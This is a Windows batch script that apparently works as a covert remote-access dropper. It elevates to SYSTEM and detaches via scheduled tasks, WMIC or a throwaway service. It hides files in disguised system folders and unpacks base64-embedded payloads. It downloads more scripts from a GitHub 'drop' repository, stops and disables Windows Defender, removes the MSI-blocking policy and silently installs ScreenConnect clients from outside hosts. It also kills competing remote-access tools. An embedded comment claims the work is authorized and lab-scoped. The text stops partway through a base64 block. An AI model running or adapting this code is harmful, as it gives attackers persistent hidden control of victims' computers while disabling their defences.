@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O41 - exterminate was killing Gryxa; sync FP; no null-path kill
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (9908198e668e4750)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=9908198e668e4750"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O41 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O41" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O41 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O41: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M31" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S9" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T16" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L18" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O41 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
rem O41: NEVER msiexec here — gryxa-ensure locks if any non-sevrz SC Running.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O41 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmCnJlbSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKcmVtICBPV05fTU9OICBCVUlMRCAyMDI2
MDgwMk0zMQpyZW0gIE80MTogZXh0ZXJtaW5hdGUga2lsbGVkIEdyeXhhIChudWxsLXBhdGggcHJv
Yyk7IHN5bmMgRlAgYmVmb3JlIGtpbGw7IGZpeCBoZWFsLgpyZW0gIEF1dGhvcml6ZWQgaW50ZXJu
YWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5LgpyZW0g4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KCnNldCAiS0VFUF9GUD01
ZjYwMTA1Nzk4NTJlNTA3IgpzZXQgIkFMVF9GUD1mODYxYzgxNDBkNDUzNDI3IgpzZXQgIkdSWVhB
X0ZQPTk5MDgxOThlNjY4ZTQ3NTAiCnNldCAiV0Q9QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdp
bmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUiCnNldCAiRVRMPUM6XFByb2dyYW1EYXRhXE1pY3Jvc29m
dFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIgpzZXQgIkxPRz0lV0QlXG93bl9tb24ubG9nIgpz
ZXQgIlNUQVRFPSVXRCVcb3duX21vbi5zdGF0ZSIKc2V0ICJIQkZMQUc9JVdEJVxoYi5mbGFnIgpz
ZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwuZXhlIgpzZXQgIlRHPWh0dHBzOi8v
cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3RnX3Jl
cG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIlRHMj1odHRwczovL2Nkbi5qc2RlbGl2
ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRP
TSUlUkFORE9NJSIKc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t
L3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFORE9NJSVSQU5E
T00lIgpzZXQgIk9XTlNFQzI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dp
dGh1Yi1kcm9wQG1haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIgpzZXQgIk9X
Tk1PTj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRy
b3AvbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiT1dOTU9OMj1odHRw
czovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fbW9u
LmNtZD90PSVSQU5ET00lJVJBTkRPTSUiCnNldCAiT1dOTElCPWh0dHBzOi8vcmF3LmdpdGh1YnVz
ZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9saWIucHMxP3Q9JVJB
TkRPTSUlUkFORE9NJSIKc2V0ICJPV05MSUIyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94
bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9saWIucHMxP3Q9JVJBTkRPTSUlUkFORE9NJSIK
c2V0ICJNU0lfVVJMPWh0dHBzOi8vdWkuc2V2cnouY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVu
dFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0IgpzZXQgIk1TSV9HUllYQT1odHRwczovL3VpLmdy
eXhhLmNvbS9CaW4vU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2k/ZT1BY2Nlc3MmeT1HdWVz
dCIKc2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVk
ZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIgpzZXQgIk1TSV9QS0cyPWh0dHBzOi8vY2RuLmpz
ZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL3BrZy5tc2kiCnNldCAiTVNJ
PSVQcm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5DbGllbnRTZXR1cC5tc2kiCnNldCAiTVNJQ0FD
SEU9JVdEJVxwa2cubXNpIgpzZXQgIk1TSV9HPSVQcm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5H
cnl4YS5tc2kiCnNldCAiTVNJQ0FDSEVfRz0lV0QlXHBrZ19ncnl4YS5tc2kiCgppZiBub3QgZXhp
c3QgIiVXRCUiIG1kICIlV0QlIiAyPm51bAppZiBub3QgZXhpc3QgIiVMT0clIiB0eXBlIG51bD4i
JUxPRyUiIDI+bnVsCgpzZXQgIk1PTlZFUj1NMzEiCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4
NiklIgpzZXQgIkdSWVhBX0RFRVA9JVdEJVxncnl4YV9kZWVwLmZsYWciCnJlbSBsb2FkIGN1cnJl
bnQgR3J5eGEgRlAgKG1heSByb3RhdGUgd2hlbiBzZXJ2ZXIva2V5cyBjaGFuZ2UpCmlmIGV4aXN0
ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAl
JUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0
ICJHUllYQV9GUD0lJUwiCmlmIG5vdCBkZWZpbmVkIEdSWVhBX0ZQIHNldCAiR1JZWEFfRlA9OTkw
ODE5OGU2NjhlNDc1MCIKZm9yIC9mICJ0b2tlbnM9MS0zIGRlbGltcz0vICIgJSVhIGluICgiJWRh
dGUlIikgZG8gc2V0ICJEVD0lZGF0ZSUgJXRpbWUlIgplY2hvLj4+IiVMT0clIgplY2hvIOKUgOKU
gCB0aWNrICFEVCEgW3ZlciAlTU9OVkVSJV0g4pSA4pSAPj4iJUxPRyUiCnNldCAiQ09VTlQ9MCIK
c2V0ICJJTlNUQUxMRUQ9MCIKc2V0ICJQUklNX09LPTAiCnNldCAiQUxUX09LPTAiCnNldCAiRk9S
RUlHTl9MRUZUPTAiCnNldCAiRk9SRUlHTl9MSVNUPSIKc2V0ICJNU0lFWElUPW5vdC1ydW4iCgpy
ZW0g4pSA4pSAIFswXSBzaW5nbGUtZmxpZ2h0IG11dGV4IChzdG9wIG92ZXJsYXBwaW5nIHRpY2tz
IHJhY2luZyBtc2lleGVjKSDilIDilIAKc2V0ICJNVVRFWD0lV0QlXHRpY2subG9jayIKaWYgZXhp
c3QgIiVNVVRFWCUiICgKICBmb3IgJSVBIGluICgiJU1VVEVYJSIpIGRvIHNldCAiTE9DS0FHRT0l
JX50QSIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJp
ZigoVGVzdC1QYXRoICclTVVURVglJykgLWFuZCAoKChHZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRl
cmFsUGF0aCAnJU1VVEVYJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0
IDgpKXsgZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjEKICBpZiBlcnJvcmxldmVs
IDEgKAogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0ZXhfYnVzeT4+IiVMT0clIgogICAgZW5kbG9j
YWwKICAgIGV4aXQgL2IgMAogICkKKQplY2hvICVEQVRFJSAlVElNRSUgJVJBTkRPTSU+IiVNVVRF
WCUiCgpyZW0g4pSA4pSAIHBlci1ob3N0IGlkZW50aXR5IChhbnRpLXNpZ25hdHVyZSkg4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSACmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93
bl9saWIucHMxIiAtQWN0aW9uIGluaXQgLVdvcmtEaXIgIiVXRCUiID5udWwgMj4mMQppZiBleGlz
dCAiJVdEJVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9
PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0lJUwiCmlmIG5vdCBk
ZWZpbmVkIFRBU0tfQSBzZXQgIlRBU0tfQT1XZXJRdWV1ZVN5bmMiCmlmIG5vdCBkZWZpbmVkIFRB
U0tfQiBzZXQgIlRBU0tfQj1QbGFTZXJ2ZXJIZWFsdGgiCmlmIG5vdCBkZWZpbmVkIFRBU0tfQyBz
ZXQgIlRBU0tfQz1XZGlIb3N0UHJveHkiCmlmIG5vdCBkZWZpbmVkIFRBU0tfRCBzZXQgIlRBU0tf
RD1UY3BJcENvbmZsaWN0UmVzIgppZiBub3QgZGVmaW5lZCBNT19BIHNldCAiTU9fQT0yIgppZiBu
b3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIgoKcmVtIOKUgOKUgCBbQV0gYXV0by11cGRhdGUg
Y29yZSBmaWxlcyAoYmVzdCBlZmZvcnQpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgAppZiBub3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJDVVJMPWN1
cmwuZXhlIgoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAt
LW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3JlcG9ydC5uZXciICIlVEclIiA+bnVsIDI+JjEKaWYg
bm90IGV4aXN0ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1l
b3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQubmV3IiAiJVRHMiUiID5udWwg
Mj4mMQphdHRyaWIgLWggLXMgLXIgIiVXRCVcdGdfcmVwb3J0LnBzMSIgPm51bCAyPiYxCmZpbmRz
dHIgL0M6IlRHX1JFUE9SVCBCVUlMRCIgIiVXRCVcdGdfcmVwb3J0Lm5ldyIgPm51bCAyPiYxICYm
